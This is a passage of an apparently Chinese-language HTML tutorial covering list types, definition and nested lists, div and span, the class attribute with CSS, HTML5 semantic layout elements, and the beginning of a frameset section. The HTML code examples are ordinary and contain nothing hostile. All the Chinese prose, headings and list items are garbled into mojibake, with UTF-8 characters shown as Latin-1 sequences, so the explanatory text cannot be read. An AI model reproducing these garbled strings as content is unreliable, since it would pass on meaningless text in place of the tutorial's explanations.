punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>è‹¹æœ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>é¦™è•‰<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>æŸ æª¬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>æ¡”å­<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>  </code></pre><ul type="disc"> <li>è‹¹æœ</li> <li>é¦™è•‰</li> <li>æŸ æª¬</li> <li>æ¡”å­</li></ul>  <h4 id="circle-ç±»å‹"><a href="#circle-ç±»å‹" class="headerlink" title="circle ç±»å‹"></a>circle ç±»å‹</h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>circle<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>è‹¹æœ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>é¦™è•‰<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>æŸ æª¬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>æ¡”å­<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>  </code></pre><ul type="circle"> <li>è‹¹æœ</li> <li>é¦™è•‰</li> <li>æŸ æª¬</li> <li>æ¡”å­</li></ul>  <h4 id="square-ç±»å‹"><a href="#square-ç±»å‹" class="headerlink" title="square ç±»å‹"></a>square ç±»å‹</h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>square<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>è‹¹æœ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>é¦™è•‰<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>æŸ æª¬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>æ¡”å­<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>  </code></pre><ul type="square"> <li>è‹¹æœ</li> <li>é¦™è•‰</li> <li>æŸ æª¬</li> <li>æ¡”å­</li></ul>  <h3 id="æœ‰åºåˆ—è¡¨"><a href="#æœ‰åºåˆ—è¡¨" class="headerlink" title="æœ‰åºåˆ—è¡¨"></a>æœ‰åºåˆ—è¡¨</h3><p><strong>Ordered list</strong></p><p>åˆ—è¡¨é¡¹ç›®é»˜è®¤ä½¿ç”¨æ•°å­—è¿›è¡Œæ ‡è®°ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>First item<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>Next item<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">&gt;</span></span></code></pre><ol><li>First item</li><li>Next item</li></ol><p>æœ‰åºåˆ—è¡¨ä¹Ÿå¯ä»¥å®šä¹‰ä¸åŒçš„æ ·å¼</p><h4 id="æ•°å­—åˆ—è¡¨"><a href="#æ•°å­—åˆ—è¡¨" class="headerlink" title="æ•°å­—åˆ—è¡¨"></a>æ•°å­—åˆ—è¡¨</h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>è‹¹æœ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>é¦™è•‰<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>æŸ æª¬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>æ¡”å­<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">&gt;</span></span>  </code></pre><ol type="1"> <li>è‹¹æœ</li> <li>é¦™è•‰</li> <li>æŸ æª¬</li> <li>æ¡”å­</li></ol>  <h4 id="å­—æ¯åˆ—è¡¨"><a href="#å­—æ¯åˆ—è¡¨" class="headerlink" title="å­—æ¯åˆ—è¡¨"></a>å­—æ¯åˆ—è¡¨</h4><p>å¤§å†™å­—æ¯</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>A<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>è‹¹æœ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>é¦™è•‰<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>æŸ æª¬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>æ¡”å­<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">&gt;</span></span>  </code></pre><ol type="A"> <li>è‹¹æœ</li> <li>é¦™è•‰</li> <li>æŸ æª¬</li> <li>æ¡”å­</li></ol>  <p>å°å†™å­—æ¯æ”¹æˆ <code>&lt;ol type="a"&gt; </code> å³å¯ã€‚</p><h4 id="ç½—é©¬å­—æ¯åˆ—è¡¨"><a href="#ç½—é©¬å­—æ¯åˆ—è¡¨" class="headerlink" title="ç½—é©¬å­—æ¯åˆ—è¡¨"></a>ç½—é©¬å­—æ¯åˆ—è¡¨</h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>I<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>è‹¹æœ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>é¦™è•‰<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>æŸ æª¬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>æ¡”å­<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">&gt;</span></span>  </code></pre><ol type="I"> <li>è‹¹æœ</li> <li>é¦™è•‰</li> <li>æŸ æª¬</li> <li>æ¡”å­</li></ol>  <p>å°å†™ç½—é©¬å­—æ¯åˆ™ä¸º <code>&lt;ol type="i"&gt;</code> ã€‚</p><ol type="i"> <li>è‹¹æœ</li> <li>é¦™è•‰</li> <li>æŸ æª¬</li></ol><h3 id="å®šä¹‰åˆ—è¡¨"><a href="#å®šä¹‰åˆ—è¡¨" class="headerlink" title="å®šä¹‰åˆ—è¡¨"></a>å®šä¹‰åˆ—è¡¨</h3><p><strong>Definition list</strong></p><p>è‡ªå®šä¹‰åˆ—è¡¨ä¸ä»…ä»…æ˜¯ä¸€åˆ—é¡¹ç›®ï¼Œè€Œæ˜¯é¡¹ç›®åŠå…¶æ³¨é‡Šçš„ç»„åˆã€‚</p><p>è‡ªå®šä¹‰åˆ—è¡¨ä»¥ <code>&lt;dl&gt;</code> æ ‡ç­¾å¼€å§‹ã€‚æ¯ä¸ªè‡ªå®šä¹‰åˆ—è¡¨é¡¹ä»¥ <code>&lt;dt&gt;</code> å¼€å§‹ã€‚æ¯ä¸ªè‡ªå®šä¹‰åˆ—è¡¨é¡¹çš„å®šä¹‰ä»¥ <code>&lt;dd&gt;</code> å¼€å§‹ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">&gt;</span></span>First term<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">&gt;</span></span>Definition<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">&gt;</span></span>Next term<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">&gt;</span></span>Definition<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">&gt;</span></span></code></pre><dl>    <dt>First term</dt>    <dd>Definition</dd>    <dt>Next term</dt>    <dd>Definition</dd></dl><h3 id="åµŒå¥—åˆ—è¡¨"><a href="#åµŒå¥—åˆ—è¡¨" class="headerlink" title="åµŒå¥—åˆ—è¡¨"></a>åµŒå¥—åˆ—è¡¨</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>å’–å•¡<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>èŒ¶        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>çº¢èŒ¶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>ç»¿èŒ¶                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>ä¸­å›½èŒ¶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>éæ´²èŒ¶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>ç‰›å¥¶<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span></code></pre><ul>    <li>å’–å•¡</li>    <li>èŒ¶        <ul>            <li>çº¢èŒ¶</li>            <li>ç»¿èŒ¶                <ul>                    <li>ä¸­å›½èŒ¶</li>                    <li>éæ´²èŒ¶</li>                </ul>            </li>        </ul>    </li>    <li>ç‰›å¥¶</li></ul><br><h2 id="å—"><a href="#å—" class="headerlink" title="å—"></a>å—</h2><p>å¯ä»¥é€šè¿‡  <code>&lt;div&gt;</code>  å’Œ  <code>&lt;span&gt;</code> å°† HTML å…ƒç´ ç»„åˆèµ·æ¥ã€‚</p><p>å¤§å¤šæ•° HTML å…ƒç´ è¢«å®šä¹‰ä¸º<strong>å—çº§å…ƒç´ </strong>æˆ–<strong>å†…è”å…ƒç´ </strong>ã€‚â€œå—çº§å…ƒç´ â€ <em>block level element</em>ï¼Œâ€œå†…è”å…ƒç´ â€ <em>inline element</em>ã€‚</p><p><strong>å—çº§å…ƒç´ </strong>åœ¨æµè§ˆå™¨æ˜¾ç¤ºæ—¶ï¼Œé€šå¸¸ä¼šä»¥æ–°è¡Œæ¥å¼€å§‹ï¼ˆå’Œç»“æŸï¼‰ã€‚</p><p><strong>å†…è”å…ƒç´ </strong>åœ¨æ˜¾ç¤ºæ—¶é€šå¸¸ä¸ä¼šä»¥æ–°è¡Œå¼€å§‹ã€‚</p><h3 id="div-å…ƒç´ "><a href="#div-å…ƒç´ " class="headerlink" title="div å…ƒç´ "></a>div å…ƒç´ </h3><p>division/section</p><p>å¯ä»¥è¯´æ˜¯æœ€å¸¸ç”¨çš„<strong>å—çº§å…ƒç´ </strong>8ã€‚å¯ç”¨äºç»„åˆå…¶ä»– HTML å…ƒç´ çš„å®¹å™¨ã€‚</p><p>å®ƒæ²¡æœ‰ç‰¹å®šçš„å«ä¹‰ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œç”±äºå®ƒå±äºå—çº§å…ƒç´ ï¼Œæµè§ˆå™¨ä¼šåœ¨å…¶å‰åæ˜¾ç¤ºæŠ˜è¡Œã€‚</p><p>å¦‚æœä¸ CSS ä¸€åŒä½¿ç”¨ï¼Œ<code>&lt;div&gt;</code> å…ƒç´ å¯ç”¨äº<strong>å¯¹å¤§çš„å†…å®¹å—è®¾ç½®æ ·å¼å±æ€§</strong>ã€‚</p><p><code>&lt;div&gt;</code> å…ƒç´ çš„å¦ä¸€ä¸ªå¸¸è§çš„ç”¨é€”æ˜¯<strong>æ–‡æ¡£å¸ƒå±€</strong>ã€‚</p><h3 id="span-å…ƒç´ "><a href="#span-å…ƒç´ " class="headerlink" title="span å…ƒç´ "></a>span å…ƒç´ </h3><p><strong>å†…è”å…ƒç´ </strong>ï¼Œå¯ç”¨ä½œæ–‡æœ¬çš„å®¹å™¨ã€‚</p><p>ä¹Ÿæ²¡æœ‰ç‰¹å®šçš„å«ä¹‰ã€‚</p><p>ä¹Ÿå¯ä»¥ä¸ CSS ä¸€åŒä½¿ç”¨ï¼Œæ¥ç»™éƒ¨åˆ†æ–‡æœ¬å®šä¹‰æ ·å¼å±æ€§ã€‚</p><br><h2 id="ç±»"><a href="#ç±»" class="headerlink" title="ç±»"></a>ç±»</h2><p><code>class</code>å±æ€§</p><p>å¯ä»¥ç”¨æ¥ç»™åŒä¸€ç±»å…ƒç´ è®¾ç½®ç›¸åŒçš„æ ·å¼ã€‚</p><p>è®¾ç½® <code>&lt;div&gt;</code> å…ƒç´ çš„ç±»ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸ºç›¸åŒçš„ <code>&lt;div&gt;</code> å…ƒç´ è®¾ç½®ç›¸åŒçš„æ ·å¼ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">.miaotest</span> <span class="token punctuation">{</span>    <span class="token property">background-color</span><span class="token punctuation">:</span>pink<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span>white<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token punctuation">}</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>miaotest<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>London<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>miaotest<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Paris<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Paris is the capital and most populous city of France.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span></code></pre><style>.miaotest {    background-color:pink;    color:white;    margin:20px;    padding:20px;} </style><div class="miaotest"><p>London</p><p>London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants.</p></div><div class="miaotest"><p>Paris</p><p>Paris is the capital and most populous city of France.</p></div><p>åŒç†ï¼Œä¹Ÿå¯ä»¥è®¾ç½® <code>&lt;span&gt;</code> å…ƒç´ çš„<code>class</code>å±æ€§æ¥å¯¹ç›¸åŒç±»è®¾ç½®æ ·å¼ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">  <span class="token selector">span.redtest</span> <span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>My <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>redtest<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Important<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span> Things<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><style>  span.redtest {color:red;}</style><p>My <span class="redtest">Important</span> Things</p><br><h2 id="ç½‘é¡µå¸ƒå±€"><a href="#ç½‘é¡µå¸ƒå±€" class="headerlink" title="ç½‘é¡µå¸ƒå±€"></a>ç½‘é¡µå¸ƒå±€</h2><p>è¿™é‡Œ HTML5 æ–°å¢äº†ä¸å°‘è¯­ä¹‰åŒ–å…ƒç´ ï¼Œæ›¿ä»£äº†åŸå…ˆ <code>&lt;div id="xxx"&gt;</code>è¿™æ ·å®šä¹‰ç½‘é¡µå¸ƒå±€çš„å½¢å¼ã€‚</p><p>å…·ä½“çš„è¯­ä¹‰å…ƒç´ æ˜¯è¿™æ ·çš„ã€‚</p><table><thead><tr><th align="left">è¯­ä¹‰å…ƒç´ </th><th>å«ä¹‰</th></tr></thead><tbody><tr><td align="left">header</td><td>å®šä¹‰æ–‡æ¡£æˆ–èŠ‚çš„é¡µçœ‰</td></tr><tr><td align="left">nav</td><td>å®šä¹‰å¯¼èˆªé“¾æ¥çš„å®¹å™¨</td></tr><tr><td align="left">section</td><td>å®šä¹‰æ–‡æ¡£ä¸­çš„èŠ‚</td></tr><tr><td align="left">article</td><td>å®šä¹‰ç‹¬ç«‹çš„è‡ªåŒ…å«æ–‡ç« </td></tr><tr><td align="left">aside</td><td>å®šä¹‰å†…å®¹ä¹‹å¤–çš„å†…å®¹ï¼ˆæ¯”å¦‚ä¾§æ ï¼‰</td></tr><tr><td align="left">footer</td><td>å®šä¹‰æ–‡æ¡£æˆ–èŠ‚çš„é¡µè„š</td></tr><tr><td align="left">details</td><td>å®šä¹‰é¢å¤–çš„ç»†èŠ‚</td></tr><tr><td align="left">summary</td><td>å®šä¹‰ details å…ƒç´ çš„æ ‡é¢˜</td></tr></tbody></table><p><img src="/2020/02/14/FrontEnd_HTML_Basic/ct_sem_elements.png" alt="HTML5 è¯­ä¹‰å…ƒç´ "></p><p>ä¾‹å¦‚ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>City Gallery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span><span class="token punctuation">&gt;</span></span>London<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>Paris<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>Tokyo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>London<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>London is the capital city of England. It is the most populous city in the United Kingdom,with a metropolitan area of over 13 million inhabitants.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Standing on the River Thames, London has been a major settlement for two millennia,its history going back to its founding by the Romans, who named it Londinium.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">&gt;</span></span>Copyright W3School.com.cn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span></code></pre><p>å…·ä½“åé¢å†çœ‹çœ‹ HTML5 çš„æ–°è¯­ä¹‰å…ƒç´ å§ï¼ˆ</p><br><h2 id="æ¡†æ¶-1"><a href="#æ¡†æ¶-1" class="headerlink" title="æ¡†æ¶"></a>æ¡†æ¶</h2><p><strong>é€šè¿‡ä½¿ç”¨æ¡†æ¶ï¼Œå¯ä»¥åœ¨åŒä¸€ä¸ªæµè§ˆå™¨çª—å£ä¸­æ˜¾ç¤ºä¸æ­¢ä¸€ä¸ªé¡µé¢ã€‚</strong></p><p>æ¯ä»½HTMLæ–‡æ¡£ç§°ä¸ºä¸€ä¸ªæ¡†æ¶ï¼Œå¹¶ä¸”æ¯ä¸ªæ¡†æ¶éƒ½ç‹¬ç«‹äºå…¶ä»–çš„æ¡†æ¶ã€‚</p><h3 id="ç»“æ„æ¡†æ¶æ ‡ç­¾-frameset"><a href="#ç»“æ„æ¡†æ¶æ ‡ç­¾-frameset" class="headerlink" title="ç»“æ„æ¡†æ¶æ ‡ç­¾ frameset"></a>ç»“æ„æ¡†æ¶æ ‡ç­¾ frameset</h3><p><code>frameset</code>æ ‡ç­¾ / æ¡†æ¶é›†</p><p>å®ƒå®šä¹‰äº†å¦‚ä½•å°†çª—å£åˆ†å‰²ä¸ºæ¡†æ¶ã€‚æ¯ä¸ª <code>frameset</code> å®šä¹‰äº†ä¸€ç³»åˆ— 